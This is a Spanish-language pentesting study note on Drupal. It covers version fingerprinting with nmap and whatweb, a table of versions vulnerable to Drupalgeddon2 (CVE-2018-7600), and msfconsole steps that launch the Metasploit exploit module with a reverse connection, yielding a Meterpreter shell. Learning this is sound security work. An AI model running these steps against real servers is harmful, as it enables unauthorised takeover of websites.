# 💧 Pentesting Drupal
**Drupal** es un sistema de gestión de contenidos (CMS) modular y muy flexible, enfocado en comunidades y sitios de gran escala. Al igual que WordPress, es un objetivo crítico si no está actualizado.

- **Lenguaje:** PHP
- **Base de Datos:** MySQL / MariaDB / PostgreSQL
- **Directorio por defecto:** Suele colgar de la raíz `/` o de `/drupal`.

## 🔍 1. Identificación y Reconocimiento
Para buscar exploits específicos, lo primero es determinar la versión exacta que está corriendo el servidor.
### A. Identificación mediante Nmap
El escaneo de servicios de [[Nmap]] a menudo puede detectar la versión de Drupal instalada.
- `nmap -sV -p80,443 <IP>`

![[Imagenes/DrupalVersion1.png]]

### B. Identificación mediante WhatWeb
Herramienta rápida para identificar tecnologías web y versiones.
- `whatweb http://<IP>/`

![[Imagenes/DrupalVersion2.png]]

## 🚀 2. Explotación - Drupalgeddon2 (CVE 2018-7600)
Este es el exploit más popular y crítico para Drupal. Permite la **Ejecución Remota de Código (RCE)** debido a una validación insuficiente en la API de renderizado.
### Tabla de Versiones Vulnerables
Es fundamental conocer si la versión detectada es vulnerable antes de lanzar el ataque:

| Versión de Drupal | Versiones vulnerables                 | Versión segura (parcheada) |
| ----------------- | ------------------------------------- | -------------------------- |
| **Drupal 7.x**    | 7.58 **anteriores** (todo 7.x < 7.58) | 7.58 o superior            |
| **Drupal 8.3.x**  | 8.3.9 **anteriores** (8.3.x < 8.3.9)  | 8.3.9 o superior           |
| **Drupal 8.4.x**  | 8.4.6 **anteriores** (8.4.x < 8.4.6)  | 8.4.6 o superior           |
| **Drupal 8.5.x**  | 8.5.1 **anteriores** (8.5.x < 8.5.1)  | 8.5.1 o superior           |
> [!IMPORTANT] **Nota:** Aunque se centró en las ramas 7.x y 8.x, algunas auditorías sugieren que la rama 6.x también podría verse afectada si no se aplicaron parches comunitarios.

## 🛠️ 3. Uso de Metasploit para Explotación
- **Módulo:** `exploit/unix/webapp/drupal_drupalgeddon2`

**Pasos en msfconsole:**

1. `use exploit/unix/webapp/drupal_drupalgeddon2`
2. `set RHOSTS <IP_Victima>`
3. `set LHOST <TU_IP>`
4. `set LPORT <Puerto>`
### Ajuste de Ruta (Target URI):
Por defecto, el módulo asume que Drupal está en la raíz (`/`). Si el CMS está en un subdirectorio, debes cambiar el parámetro `TARGETURI`:

- `set TARGETURI /drupal/`

Si el ataque es exitoso, recibirás una sesión de **Meterpreter**, lo que te dará control total sobre el servidor web.

#
---
**Navegación:**
- Volver a: [[CMS - Content Management System]]